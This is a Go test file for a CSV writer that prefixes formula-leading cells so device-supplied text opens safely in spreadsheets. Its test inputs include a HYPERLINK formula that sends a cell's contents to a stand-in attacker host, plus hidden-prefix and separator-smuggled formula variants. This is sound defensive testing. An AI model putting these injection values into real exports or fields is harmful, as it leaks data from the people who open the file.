package api

import (
	"encoding/csv"
	"strings"
	"testing"
)

// Hostnames and software names in these exports come from the devices, so
// whoever controls one endpoint picks text a technician opens in a
// spreadsheet. Formula-leading cells must arrive as literal text.
func TestSpreadsheetSafeCSVNeutralisesFormulas(t *testing.T) {
	var b strings.Builder
	out := &spreadsheetSafeCSV{csv.NewWriter(&b)}
	if err := out.Write([]string{
		`=HYPERLINK("https://evil.example/?"&A1,"open")`, "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
		"WIN-01", "Microsoft Office", "", "a=b",
	}); err != nil {
		t.Fatal(err)
	}
	out.Flush()
	got, err := csv.NewReader(strings.NewReader(b.String())).Read()
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		`'=HYPERLINK("https://evil.example/?"&A1,"open")`, "'+1+1", "'-2+3", "'@SUM(A1)", "'\t'=1", "'\r'=1",
		"WIN-01", "Microsoft Office", "", "a=b",
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("cell %d = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestSpreadsheetSafeCSVHandlesHiddenAndUnicodeFormulaPrefixes(t *testing.T) {
	for _, value := range []string{" =1", "\ufeff+1", "\u200b@SUM(A1)", "\x00-1", "\u0085=1", "＝1", "＋1", "－1", "＠SUM(A1)"} {
		if got := spreadsheetSafeCell(value); got != "'"+value {
			t.Errorf("unguarded cell %q = %q", value, got)
		}
	}
	for _, value := range []string{"WINDOWS-TEST", "São Paulo", "São Paulo, Ltd", "a=b", "a,b", "a;b", "a\nb", " plain text", "'=1", "1.0-beta", "C:\\x; D:\\y", `a"b`} {
		if got := spreadsheetSafeCell(value); got != value {
			t.Errorf("ordinary text changed: %q = %q", value, got)
		}
	}
}

// Excel opens a .csv with the regional list separator (';' in pt-BR, de-DE,
// es-ES) and honours quotes only at the start of its own cells, so a value
// such as "x;=1+1" becomes a second cell beginning with a formula. Every
// place a cell can begin is guarded, not only the start of the value.
func TestSpreadsheetSafeCellGuardsEveryCellStart(t *testing.T) {
	for value, want := range map[string]string{
		"x;=1+1":      "x;'=1+1",
		"x;=1+1;y":    "x;'=1+1;y",
		"x; =1+1":     "x;' =1+1",
		"x;\u200b+1":  "x;'\u200b+1",
		"x,-2+3":      "x,'-2+3",
		"x\t@SUM(A1)": "x\t'@SUM(A1)",
		"x\n=1+1":     "x\n'=1+1",
		"x\r\n=1+1":   "x\r\n'=1+1",
		"x;=1;=2":     "x;'=1;'=2",
		";=1":         ";'=1",
		"=1;=2":       "'=1;'=2",
		"\n=1":        "'\n'=1",
		"\tordinary":  "'\tordinary",
		"x;＝1":        "x;'＝1",
	} {
		if got := spreadsheetSafeCell(value); got != want {
			t.Errorf("%q = %q, want %q", value, got, want)
		}
	}
}
